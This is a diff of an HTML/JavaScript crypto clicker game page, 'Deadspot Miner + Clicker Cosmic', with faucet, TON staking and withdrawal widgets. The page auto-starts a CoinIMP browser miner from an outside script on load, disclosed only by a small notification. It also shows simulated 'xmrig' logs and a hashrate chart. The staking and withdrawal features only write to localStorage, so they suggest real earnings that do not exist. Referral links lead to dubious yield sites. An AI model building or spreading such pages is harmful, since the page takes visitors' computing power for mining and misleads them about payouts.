@@ -11,15 +11,13 @@ button { padding:5px 10px; margin:5px; cursor:pointer; border-radius:3px; border
 button:hover { background:#66bb6a; }
 h1 { color:#4caf50; margin:20px 0; }
 
-#loginBox, #registerBox, #gameBox { display:none; margin-top:30px; }
-#gameBox { position:relative; min-height:850px; }
 #deadspotBalance { font-size:22px; margin:10px; color:#ffd700; }
-#energyBar { width:300px; height:20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden; }
+#energyBar { width: 300px; height: 20px; border:1px solid #444; margin:10px auto; background:#222; border-radius:5px; overflow:hidden; }
 #energyFill { height:100%; width:100%; background:#4caf50; transition: width 0.2s; }
 
-#clickBtn { width:220px; height:220px; border-radius:50%; background:#111; border:3px solid #444;
-cursor:pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
-overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation:pulseClick 2s infinite alternate; z-index:5; }
+#clickBtn { width: 220px; height: 220px; border-radius: 50%; background: #111; border: 3px solid #444;
+cursor: pointer; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
+overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation: pulseClick 2s infinite alternate; z-index:2; }
 #clickBtn img { width:100%; height:100%; object-fit:cover; }
 #clickBtn:active { transform:translate(-50%,-50%) scale(0.95); box-shadow:0 0 30px #ff0000 inset; }
 @keyframes pulseClick { 0%{box-shadow:0 0 15px #4caf50 inset;} 100%{box-shadow:0 0 30px #00f;} }
@@ -31,7 +29,7 @@ overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation:pulseClick 2s infi
 .logRejected { color:#f44336; }
 
 #pulseurBox { position:absolute; top:10px; right:10px; width:250px; text-align:center; z-index:2; }
-#pulseur { width:50px; height:50px; margin:5px auto; background:red; border-radius:50%; animation:pulse 1.5s infinite alternate; cursor:pointer; }
+#pulseur { width:50px; height:50px; margin:5px auto; background:red; border-radius:50%; animation: pulse 1.5s infinite alternate; cursor:pointer; }
 @keyframes pulse { 0%{transform:scale(1);} 100%{transform:scale(1.2);} }
 
 #stakedInfo, #stakingBonus { margin:5px; }
@@ -43,277 +41,77 @@ overflow:hidden; box-shadow:0 0 15px #4caf50 inset; animation:pulseClick 2s infi
 .spaceship { position:absolute; width:30px; height:15px; background:cyan; clip-path:polygon(0% 0%,100% 50%,0% 100%); animation:fly linear infinite; z-index:-1; }
 @keyframes fly { 0%{left:-40px;} 100%{left:100%;} }
 
-#faucetBtn {
-  left: 55%; /* plus à droite */
-}
-
+#faucetBtn { position:absolute; top:360px; left:60%; transform:translateX(-50%); padding:10px 20px; background:#00bcd4; border-radius:5px; cursor:pointer; }
 #faucetCooldown { color:#fff; margin-top:5px; }
 
-#refLinks { position:absolute; bottom:20px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.5); padding:10px; border-radius:5px; max-width:90%; text-align:left; z-index:3; }
-#refLinks a { color:#00bcd4; text-decoration:none; }
-#refLinks a:hover { text-decoration:underline; }
+#refLinks { position:absolute; bottom:10px; left:50%; transform:translateX(-50%); background:rgba(0,0,0,0.5); padding:10px; border-radius:5px; max-width:90%; text-align:left; }
+#refLinks h3 { color:#4caf50; margin:5px; }
+#refLinks a { color:#00bcd4; font-size:12px; text-decoration:none; }
 </style>
 </head>
 <body>
 
 <h1>💎 Deadspot Miner + Clicker Cosmic</h1>
 
-<!-- LOGIN & REGISTER -->
-<div id="registerBox">
-  <h2>Sign Up</h2>
-  <input type="text" id="regUsername" placeholder="Username"><br>
-  <input type="password" id="regPassword" placeholder="Password"><br>
-  <button onclick="register()">Sign Up</button>
-  <p id="regMsg"></p>
-  <p>Already have an account? <a href="#" onclick="showLogin()">Login</a></p>
+<div id="deadspotBalance">Deadspot: 0</div>
+<div id="energyBar"><div id="energyFill"></div></div>
+<div id="clickBtn"><img src="skull.png" alt="skull"></div>
+
+<div id="xmrigLogsBox"></div>
+
+<div id="pulseurBox">
+  <div id="pulseur"></div>
+  <div id="stakedInfo">Total staké : 0 TON</div>
+  <div id="stakingBonus">Bonus reçu : 0 DSC</div>
+  <button id="verifyDepositBtn">✅ Vérifier Dépôt</button>
+  <button id="withdrawBtn">📤 Retirer mes TON</button>
+  <button id="convertBonusBtn">💎 Convertir Bonus → Deadspot</button>
+  <div id="stakeHistory"></div>
 </div>
 
-<div id="loginBox">
-  <h2>Login</h2>
-  <input type="text" id="loginUsername" placeholder="Username"><br>
-  <input type="password" id="loginPassword" placeholder="Password"><br>
-  <button onclick="login()">Login</button>
-  <p id="loginMsg"></p>
-  <p>No account? <a href="#" onclick="showRegister()">Sign Up</a></p>
-</div>
+<canvas id="hashrateChart" width="400" height="200"></canvas>
 
-<!-- GAME -->
-<div id="gameBox">
-  <div id="deadspotBalance">Deadspot: 0</div>
-  <div id="energyBar"><div id="energyFill"></div></div>
+<div id="faucetBtn">💧 Claim Faucet</div>
+<div id="faucetCooldown"></div>
 
-  <div id="clickBtn"><img src="skull.png" alt="skull"></div>
-
-  <!-- Faucet -->
-  <div id="faucetBtn">💧 Claim Faucet</div>
-  <div id="faucetCooldown"></div>
-
-  <!-- XMrig logs -->
-  <div id="xmrigLogsBox"></div>
-
-  <!-- Pulseur + staking -->
-  <div id="pulseurBox">
-    <div id="pulseur"></div>
-    <div id="stakedInfo">Total staké : 0 TON</div>
-    <div id="stakingBonus">Bonus reçu : 0 DSC</div>
-    <button id="verifyDepositBtn">✅ Vérifier Dépôt</button>
- 
-    <!-- BOUTON RETRAIT -->
-<button id="withdrawBtn">💸 Retirer TON Staked</button>
-
-<!-- POPUP FORMULAIRE RETRAIT -->
-<div id="withdrawPopup" class="popup">
-  <div class="popup-content">
-    <span class="close">&times;</span>
-    <h2>Demande de Retrait</h2>
-    <form id="withdrawForm">
-      <label>Adresse Wallet TON :</label>
-      <input type="text" id="tonWallet" required>
-
-      <label>Montant à retirer (TON) :</label>
-      <input type="number" id="withdrawAmount" min="1.50" step="0.01" required>
-
-      <label>Email FaucetPay :</label>
-      <input type="email" id="faucetpayEmail" required>
-
-      <p style="font-size:12px;color:#aaa;">
-        ⚠️ Des frais fixes de 0.2 TON seront déduits de chaque retrait.
-      </p>
-      <button type="submit">Confirmer Retrait</button>
-    </form>
-  </div>
-</div>
-
-<style>
-/* Style bouton */
-#withdrawBtn {
-  padding:10px 20px;
-  background:#ff4444;
-  color:#fff;
-  border:none;
-  border-radius:5px;
-  cursor:pointer;
-  margin-top:10px;
-}
-
-/* Popup */
-.popup {
-  display:none;
-  position:fixed;
-  top:0; left:0;
-  width:100%; height:100%;
-  background:rgba(0,0,0,0.7);
-  justify-content:center;
-  align-items:center;
-  z-index:1000;
-}
-.popup-content {
-  background:#111;
-  padding:20px;
-  border-radius:10px;
-  width:300px;
-  color:#fff;
-  box-shadow:0 0 15px #00bcd4;
-}
-.popup-content h2 {
-  margin-top:0;
-  text-align:center;
-}
-.popup-content input {
-  width:100%;
-  padding:8px;
-  margin:6px 0;
-  border:none;
-  border-radius:5px;
-}
-.popup-content button {
-  width:100%;
-  padding:10px;
-  background:#00bcd4;
-  border:none;
-  border-radius:5px;
-  color:#000;
-  font-weight:bold;
-  cursor:pointer;
-}
-.close {
-  position:absolute;
-  top:15px;
-  right:20px;
-  font-size:24px;
-  cursor:pointer;
-}</style>
-    
-<script>
-// Ouvrir/fermer le popup
-const withdrawBtn = document.getElementById("withdrawBtn");
-const popup = document.getElementById("withdrawPopup");
-const closeBtn = document.querySelector(".close");
-
-withdrawBtn.onclick = () => popup.style.display = "flex";
-closeBtn.onclick = () => popup.style.display = "none";
-window.onclick = (e) => { if (e.target === popup) popup.style.display = "none"; }
-
-// Gérer le formulaire
-document.getElementById("withdrawForm").addEventListener("submit", function(e){
-  e.preventDefault();
-
-  let wallet = document.getElementById("tonWallet").value;
-  let amount = parseFloat(document.getElementById("withdrawAmount").value);
-  let email = document.getElementById("faucetpayEmail").value;
-
-  if(amount < 1.5){
-    alert("Le montant minimum de retrait est 1.50 TON !");
-    return;
-  }
-
-  let finalAmount = (amount - 0.2).toFixed(2);
-
-  // Sauvegarde en localStorage (pour test)
-  let withdrawals = JSON.parse(localStorage.getItem("withdrawals")) || [];
-  withdrawals.push({wallet, amount, finalAmount, email, date:new Date().toLocaleString()});
-  localStorage.setItem("withdrawals", JSON.stringify(withdrawals));
-
-  alert(`✅ Demande de retrait enregistrée !
-Montant demandé : ${amount} TON
-Frais : 0.2 TON
-Montant net : ${finalAmount} TON
-Wallet : ${wallet}
-Email FaucetPay : ${email}`);
-
-  popup.style.display = "none";
-  this.reset();
-});
-</script>
-  <canvas id="hashrateChart" width="400" height="200"></canvas>
-
-  <!-- Liens referral -->
-  <div id="refLinks">
-    <h3>🔗 Liens Utiles / Références :</h3>
-    <ul style="list-style:none; padding:0; margin:0; font-size:12px;">
-      <li><a href="https://maximlprive1990.github.io/mainnet-mini-mining-game/" target="_blank">Mini Mining Game</a></li>
-      <li><a href="https://maximlprive1990.github.io/Coinimp-miner-to-earn/" target="_blank">CoinIMP Miner</a></li>
-      <li><a href="https://cryptominingimpmininghash.store/app" target="_blank">Crypto Mining IMP</a></li>
-      <li><a href="https://tonstakevault.info/" target="_blank">TON Stake Vault</a></li>
-      <li><a href="https://cryptoyieldhub.info/" target="_blank">Crypto Yield Hub</a></li>
-      <li><a href="https://maximlprive1990.github.io/Deadspot-miner-pool.coinimp.com/" target="_blank">Deadspot Miner Pool</a></li>
-    </ul>
-  </div>
+<!-- Liens referral -->
+<div id="refLinks">
+  <h3>🔗 Liens Utiles / Références :</h3>
+  <ul style="list-style:none; padding:0; margin:0; font-size:12px;">
+    <li><a href="https://maximlprive1990.github.io/mainnet-mini-mining-game/" target="_blank">Mini Mining Game</a></li>
+    <li><a href="https://maximlprive1990.github.io/Coinimp-miner-to-earn/" target="_blank">CoinIMP Miner</a></li>
+    <li><a href="https://cryptominingimpmininghash.store/app" target="_blank">Crypto Mining IMP</a></li>
+    <li><a href="https://tonstakevault.info/" target="_blank">TON Stake Vault</a></li>
+    <li><a href="https://cryptoyieldhub.info/" target="_blank">Crypto Yield Hub</a></li>
+    <li><a href="https://maximlprive1990.github.io/Deadspot-miner-pool.coinimp.com/" target="_blank">Deadspot Miner Pool</a></li>
+  </ul>
 </div>
 
 <div id="stars"></div>
 
-  
-<!-- CoinIMP Miner -->
 <script src="https://www.hostingcloud.racing/I9tR.js"></script>
 <script>
-var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
-    throttle: 0.4, c: 'w'
-});
+var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', { throttle: 0.4, c: 'w' });
 _client.start();
 _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 20, "#3d3d3d");
 </script>
 
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 <script>
-  
-// ---------------- LOGIN & REGISTER ----------------
-function showRegister(){ document.getElementById('registerBox').style.display='block'; document.getElementById('loginBox').style.display='none'; }
-function showLogin(){ document.getElementById('registerBox').style.display='none'; document.getElementById('loginBox').style.display='block'; }
-
-function register(){
-  let username=document.getElementById('regUsername').value.trim();
-  let password=document.getElementById('regPassword').value.trim();
-  if(!username || !password){ document.getElementById('regMsg').textContent="Fill all fields!"; return; }
-  let users=JSON.parse(localStorage.getItem('users'))||{};
-  if(users[username]){ document.getElementById('regMsg').textContent="Username exists!"; return; }
-  users[username]=password;
-  localStorage.setItem('users', JSON.stringify(users));
-  document.getElementById('regMsg').textContent="Account created!";
-  document.getElementById('regUsername').value=''; document.getElementById('regPassword').value='';
-}
-
-function login(){
-  let username=document.getElementById('loginUsername').value.trim();
-  let password=document.getElementById('loginPassword').value.trim();
-  let users=JSON.parse(localStorage.getItem('users'))||{};
-  if(users[username] && users[username]===password){
-    localStorage.setItem('currentUser', username);
-    showGame();
-  } else { document.getElementById('loginMsg').textContent="Invalid credentials!"; }
-}
-
-function showGame(){
-  let user=localStorage.getItem('currentUser');
-  if(user){
-    document.getElementById('registerBox').style.display='none';
-    document.getElementById('loginBox').style.display='none';
-    document.getElementById('gameBox').style.display='block';
-  }
-}
-
-function logout(){ localStorage.removeItem('currentUser'); document.getElementById('gameBox').style.display='none'; showLogin(); }
-if(localStorage.getItem('currentUser')) showGame();
-
-// ---------------- GAME ----------------
 let deadspot=parseFloat(localStorage.getItem("deadspot"))||0;
 let energy=parseFloat(localStorage.getItem("energy"))||100;
 let maxEnergy=100;
 let clickValue=0.00015;
-let upgrades=JSON.parse(localStorage.getItem("upgrades"))||{x2:false,multi:false,regen:false,auto:false};
-let autoClickInterval=null;
+let totalHashes=parseFloat(localStorage.getItem("totalHashes"))||0;
+let hashesPerSecond=0;
 
 let staked=parseFloat(localStorage.getItem("staked"))||0;
 let stakingBonus=parseFloat(localStorage.getItem("stakingBonus"))||0;
 let stakeHistory=JSON.parse(localStorage.getItem("stakeHistory"))||[];
 
-let totalHashes=parseFloat(localStorage.getItem("totalHashes"))||0;
-let hashesPerSecond=0;
-
 function saveGame(){
   localStorage.setItem("deadspot",deadspot);
   localStorage.setItem("energy",energy);
-  localStorage.setItem("upgrades",JSON.stringify(upgrades));
   localStorage.setItem("staked",staked);
   localStorage.setItem("stakingBonus",stakingBonus);
   localStorage.setItem("stakeHistory",JSON.stringify(stakeHistory));
@@ -338,27 +136,14 @@ function updateUI(){
 
 document.getElementById("clickBtn").addEventListener("click",()=>{
   if(energy>0){
-    let gain=clickValue;
-    if(upgrades.x2) gain*=2;
-    if(upgrades.multi) gain*=5;
-    deadspot+=gain; energy--; saveGame(); updateUI();
+    deadspot+=clickValue;
+    energy--;
+    saveGame();
+    updateUI();
   }
 });
 
-setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+(upgrades.regen?2:1)); updateUI(); } },1000);
-
-function startAutoClick(){
-  if(autoClickInterval) return;
-  autoClickInterval=setInterval(()=>{
-    if(energy>0){
-      let gain=clickValue;
-      if(upgrades.x2) gain*=2;
-      if(upgrades.multi) gain*=5;
-      deadspot+=gain; energy--; saveGame(); updateUI();
-    }
-  },1000);
-}
-if(upgrades.auto) startAutoClick();
+setInterval(()=>{ if(energy<maxEnergy){ energy=Math.min(maxEnergy,energy+1); updateUI(); } },1000);
 
 document.getElementById("pulseur").addEventListener("click",()=>{
   if(staked>0){
@@ -368,38 +153,29 @@ document.getElementById("pulseur").addEventListener("click",()=>{
     saveGame(); updateUI();
   }
 });
- /* Faucet */
+
+/* Faucet */
 let faucetCooldown=0;
 const faucetBtn=document.getElementById("faucetBtn");
 const faucetCDDisplay=document.getElementById("faucetCooldown");
-
 faucetBtn.addEventListener("click",()=>{
-    if(faucetCooldown>0) return; // cooldown actif, rien à faire
-
-    // Gain aléatoire Deadspot
-    let gain=Math.random()*0.7998+3.0002;
-    deadspot += gain;
-
-    // Sauvegarde immédiate
-    saveGame();
-
-    // UI mise à jour immédiatement
-    updateUI();
-
-    // Start cooldown
-    faucetCooldown = 10;
+  if(faucetCooldown>0) return;
+  let gain=Math.random()*0.0998+0.0002;
+  deadspot+=gain;
+  faucetCooldown=30;
+  saveGame();
+  updateUI();
 });
-  
-// Décompte et affichage cooldown
 setInterval(()=>{
-    if(faucetCooldown>0) faucetCooldown--;
-    faucetCDDisplay.textContent = faucetCooldown>0 ? "Cooldown: "+faucetCooldown+"s" : "Faucet ready!";
+  if(faucetCooldown>0) faucetCooldown--;
+  faucetCDDisplay.textContent=faucetCooldown>0 ? "Cooldown: "+faucetCooldown+"s" : "Faucet ready!";
 },1000);
-  
+
 /* Chart.js */
 const ctx=document.getElementById('hashrateChart').getContext('2d');
 const hashrateChart=new Chart(ctx,{type:'line',data:{labels:[],datasets:[{label:'H/s',data:[],borderColor:'#4caf50',fill:true,tension:0.3}]},options:{responsive:false,animation:false,plugins:{legend:{labels:{color:'#eee'}}},scales:{x:{ticks:{color:'#aaa'}},y:{ticks:{color:'#aaa'}}}}});
 let time=0;
+
 /* Simulate mining logs */
 const xmrigLogs=document.getElementById("xmrigLogsBox");
 setInterval(()=>{
@@ -417,7 +193,8 @@ setInterval(()=>{
     xmrigLogs.appendChild(document.createElement("br"));
     xmrigLogs.scrollTop=xmrigLogs.scrollHeight;
   }
-  time++; updateUI();
+  time++;
+  updateUI();
 },1000);
 
 /* Stars & Spaceships */
